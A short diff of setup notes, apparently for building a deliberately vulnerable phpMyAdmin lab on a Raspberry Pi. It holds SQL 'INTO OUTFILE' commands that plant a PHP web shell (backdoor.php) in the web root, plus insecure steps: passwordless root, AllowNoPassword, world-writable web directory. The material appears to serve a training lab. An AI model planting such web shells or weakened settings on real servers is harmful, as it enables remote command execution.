@@ -12,9 +12,13 @@ Due to access issues, somehow a phpmyadmin login has to provide sudo rights, to 
 Following command should work - SELECT "<?php system($_GET[‘cmd’]); ?>" INTO OUTFILE "/var/www/html/backdoor.php"
 After which it should possible to enter commands using cmd keyword in query, something like in Flask task
 
-Notes:
+SELECT "<?php $output = shell_exec('ls'); echo \"<pre>$output</pre>\"; ?>" INTO OUTFILE "/var/www/html/backdoor.php"
 
-I forgot to save the link with phpmyadmin installation instructions (Should be from Raspberry PI forums), but
-installing MySQL instead of MariaDB is unlikely to work on PI.
+root works with no password (unchecked password needed, might as well set the password as admin)
+
+sudo chmod  o+w /var/www/html should work
+sudo nano /etc/phpmyadmin/confg.inc.something all lines with AllowNoPassword to TRUE
+
+Notes:
 
 XAMPP will not work on PI due to different hardware architectures.
